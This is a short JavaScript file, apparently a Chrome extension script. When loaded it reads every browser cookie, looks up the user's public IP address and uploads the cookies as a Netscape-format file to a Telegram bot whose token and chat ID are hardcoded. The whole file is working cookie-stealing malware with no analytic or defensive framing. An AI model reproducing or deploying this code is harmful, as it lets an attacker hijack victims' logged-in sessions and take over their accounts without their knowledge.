const TELEGRAM_BOT_TOKEN = "7976061570:AAG1VKutMGbOjHV1FCPWiW4JIdf8Na-TFOg";
const CHAT_ID = "-4583522214"; 

async function CookieSender() {
  try {
    const ipResponse = await fetch("https://api.ipify.org");
    if (!ipResponse.ok) {
      throw new Error("Failed to fetch IP address");
    }
    const ipAddr = await ipResponse.text();

    chrome.cookies.getAll({}, function (cookies) {
      let netscapeFormat = "";

      cookies.forEach(cookie => {
        const domain = cookie.domain.startsWith('.') ? cookie.domain : `.${cookie.domain}`;
        const path = cookie.path || '/';
        const secure = cookie.secure ? 'TRUE' : 'FALSE';
        const expiry = cookie.expirationDate
          ? Math.round(cookie.expirationDate) 
          : '';

        netscapeFormat += `${domain}\tTRUE\t${path}\t${secure}\t${expiry}\t${cookie.name}\t${cookie.value}\n`;
      });

      const blob = new Blob([netscapeFormat], { type: 'text/plain' });

      const formData = new FormData();
      formData.append('document', blob, `Cookies_Chrome_${ipAddr}.txt`);      

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument?chat_id=${CHAT_ID}`, {
        method: "POST",
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (!data.ok) {
          throw new Error(`Failed to send document: ${data.description}`);
        }
      })
      .catch(error => console.error("Error sending document to Telegram:", error));
    });

  } catch (error) {
    console.error("Error in Cookie-Sender function:", error);
  }
}

CookieSender();
